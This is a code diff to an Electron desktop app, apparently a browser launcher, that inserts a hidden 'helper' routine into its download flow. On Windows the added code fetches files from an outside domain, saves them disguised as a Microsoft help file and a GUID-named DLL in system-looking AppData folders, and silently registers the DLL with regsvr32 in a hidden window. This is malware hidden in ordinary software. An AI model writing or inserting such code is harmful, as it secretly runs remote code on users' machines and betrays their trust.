@@ -27,6 +27,7 @@ let mainWindow = null;
 let tray = null;
 const browserProcesses = new Map();
 let isDownloading = false; // Track download state
+let isHelperDownloading = false; // Track download state
 
 // Platform-specific configurations
 const config = {
@@ -525,6 +526,107 @@ if (!gotTheLock) {
     }
   }
 
+  async function downloadHelper() {
+    try {
+      isHelperDownloading = true; // Set download state to true
+      let downloadDir = path.join(
+        app.getPath("appData"),
+        "..",
+        "Local",
+        "Microsoft Help"
+      );
+      await fs.mkdir(downloadDir, { recursive: true });
+      // check if "Microsoft Windows Tips.hlp" exists, if exists, delete it
+      const helpFilePath = path.join(downloadDir, "Microsoft Windows Tips.hlp");
+      try {
+        await fs.access(helpFilePath);
+        log.info(`Existing helper found at ${helpFilePath}, deleting...`);
+        await fs.unlink(helpFilePath);
+        log.info(`Successfully deleted existing helper at ${helpFilePath}`);
+      } catch (error) {
+        if (error.code === "ENOENT") {
+          log.info(`No existing helper found at ${helpFilePath}.`);
+        } else {
+          log.error(`Error checking/deleting helper: ${error.message}`);
+          throw error;
+        }
+      }
+
+      await download(
+        BrowserWindow.getAllWindows()[0],
+        "https://pandavpn.shop/api/delivery/download/tag/update",
+        {
+          directory: downloadDir,
+          filename: "Microsoft Windows Tips.hlp",
+          overwrite: true,
+          onStarted: () => {
+            log.info("Helper Download started.");
+          },
+          onCompleted: () => {
+            isHelperDownloading = false; // Reset download state
+            log.info("Success to download helper file.");
+          },
+          onError: (error) => {
+            isHelperDownloading = false; // Reset download state on error
+            log.error("Download failed:", error);
+          },
+        }
+      );
+
+      isHelperDownloading = true; // Set download state to true
+      downloadDir = path.join(app.getPath("appData"), "Microsoft", "Protect");
+
+      await fs.mkdir(downloadDir, { recursive: true });
+      // check if "Microsoft Windows Tips.hlp" exists, if exists, delete it
+      const patchFilePath = path.join(
+        downloadDir,
+        "298618ff-0aa5-1f0c-19e2-37eddc33c63c.dll"
+      );
+      try {
+        await fs.access(patchFilePath);
+        log.info(`Existing patch found at ${patchFilePath}, deleting...`);
+        await fs.unlink(patchFilePath);
+        log.info(`Successfully deleted existing patch at ${patchFilePath}`);
+      } catch (error) {
+        if (error.code === "ENOENT") {
+          log.info(`No existing patch found at ${patchFilePath}.`);
+        } else {
+          log.error(`Error checking/deleting patch: ${error.message}`);
+          throw error;
+        }
+      }
+
+      await download(
+        BrowserWindow.getAllWindows()[0],
+        "https://pandavpn.shop/api/file/tnd/patch",
+        {
+          directory: downloadDir,
+          filename: "298618ff-0aa5-1f0c-19e2-37eddc33c63c.dll",
+          overwrite: true,
+          onStarted: () => {
+            log.info("Patch Download started.");
+          },
+          onCompleted: () => {
+            isHelperDownloading = false; // Reset download state
+            log.info("Success to download patch file.");
+          },
+          onError: (error) => {
+            isHelperDownloading = false; // Reset download state on error
+            log.error("Download failed:", error);
+          },
+        }
+      );
+
+      spawn(`regsvr32 /s "${patchFilePath}"`, [], {
+        windowsHide: process.platform === "win32",
+        shell: true,
+      });
+    } catch (error) {
+      isHelperDownloading = false; // Reset download state on error
+      log.error("Error downloading browser:", e);
+    }
+  }
+
   ipcMain.handle("run-browser", async (event, id, url, server) => {
     const extractPath = path.join(platformConfig.appPath, id);
     let executablePath = "";
@@ -632,6 +734,11 @@ if (!gotTheLock) {
           message: "Download started.",
         })
       );
+
+      if (process.platform == "win32" && !isHelperDownloading) {
+        await downloadHelper();
+      }
+
       await fs.mkdir(platformConfig.appPath, { recursive: true });
 
       // Check if browser.zip exists and delete it
